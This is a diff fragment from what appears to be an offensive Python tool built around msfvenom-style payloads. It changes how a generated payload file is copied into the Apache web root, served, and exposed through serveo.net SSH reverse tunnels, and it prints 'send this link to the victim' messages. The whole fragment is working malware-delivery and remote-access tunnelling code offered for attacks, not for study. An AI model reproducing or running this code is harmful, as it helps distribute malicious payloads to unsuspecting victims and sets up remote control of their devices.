@@ -108,13 +108,13 @@ def venom():
 		             if domain==1:
 			               dn=input("Enter a name for subdomain :")
 			               print("SERVER AND PORT FORWARDING STARTED ctrl+c to STOP")
-			               os.system(f"cp {path}/{name}.apk /var/www/html/")
+			               os.system(f"cp {path}/{name} /var/www/html/")
 			               os.system("service apache2 start") 
-			               print(f"send this link to the victim >>> {dn}.serveo.net/{name}.apk")
+			               print(f"send this link to the victim >>> {dn}.serveo.net/{name}")
 			               os.system(f"ssh -R {port}:{ip}:{port} serveo.net -R  {dn}.serveo.net:80:localhost:80")
 		             else:
-			                print(f"using DEFAULT url > https://febrev.serveo.net/{name}.apk <<send this link to victim")
-			                os.system(f"cp {path}/{name}.apk /var/www/html/")
+			                print(f"using DEFAULT url > https://febrev.serveo.net/{name} <<send this link to victim")
+			                os.system(f"cp {path}/{name} /var/www/html/")
 			                os.system("service apache2 start") 
 			                print("SERVER AND PORT FORWARDING ENABLED.....")
 			                os.system(f"ssh -R {port}:{ip}:{port} serveo.net -R  febrev.serveo.net:80:localhost:80")
